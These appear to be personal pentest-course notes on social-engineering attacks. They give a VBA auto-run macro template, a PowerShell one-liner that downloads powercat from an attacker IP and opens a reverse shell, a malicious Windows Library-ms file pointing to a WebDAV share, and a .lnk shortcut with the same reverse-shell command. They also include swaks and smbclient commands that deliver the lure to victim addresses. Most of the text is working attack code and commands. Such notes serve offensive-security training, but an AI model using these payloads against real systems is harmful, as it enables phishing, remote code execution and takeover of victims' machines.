
| [[04 Social Engineering Attacks#Reconnaissance\|Reconnaissance]] | [[04 Social Engineering Attacks#MSOffice Macro\|MSOffice Macro]] | [[04 Social Engineering Attacks#Windows Library Files\|Windows Library Files]] |
| ------------------------------------------------------------- | ------------------------------------------------------------- | --------------------------------------------------------------------------- |
## Reconnaissance
```shell
# Goal: Enumerate for target's installed software
kali@kali:~$ exiftool -u -a <FILE.pdf>

# Use Canarytokens to generate a link with an embedded token to fetch information from a target's browser (use social engineering)
```
## MSOffice Macro
- Create document with embedded macro inside:
```vba
Sub AutoOpen()
	MyMacro
End Sub
Sub Document_Open()
	MyMacro
End Sub
Sub MyMacro()
	Dim Str As String

	<insert payload here>
	CreateObject("Wscript.Shell").Run Str
End Sub
```
- Generate payload in PowerShell:
```powershell
kali> [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("IEX(New-Object System.Net.WebClient).DownloadString('http://<kali_ip>/powercat.ps1'); powercat -c <kali_ip> -p 4444 -e powershell"))	
```
## Windows Library Files
1. Setup WebDAV share server
	```shell
	kali@kali:~$ wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
	```
2. Create config.Library-ms to point to Kali (just change IP)
	```xml
	<?xml version="1.0" encoding="UTF-8"?>
	<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
	<name>@windows.storage.dll,-34582</name>
	<version>6</version>
	<isLibraryPinned>true</isLibraryPinned>
	<iconReference>imageres.dll,-1003</iconReference>
	<templateInfo>
	<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
	</templateInfo>
	<searchConnectorDescriptionList>
	<searchConnectorDescription>
	<isDefaultSaveLocation>true</isDefaultSaveLocation>
	<isSupported>false</isSupported>
	<simpleLocation>
	<url>http://192.168.119.2</url>
	</simpleLocation>
	</searchConnectorDescription>
	</searchConnectorDescriptionList>
	</libraryDescription>
	```
3. Create a malicious install.lnk shortcut as a reverse shell
	```shell
	# Create a shortcut(.lnk) file using the Windows Desktop: Right-Click, New, Shortcut
	# Change IP to Kali IP
	powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.3:8000/powercat.ps1');powercat -c 192.168.119.3 -p 4444 -e powershell"
	
	# Ensure powercat.ps1 in the same directory
	kali@kali:~$ python3 -m http.server 8000
	```
4. Send the .Library.ms file to the victim
	```shell
	# Via SMB
	kali@kali:~$ smbclient //<IP>/share -c 'put config.Library-ms'

	# Via SMTP/Email
	sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.50.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
	```
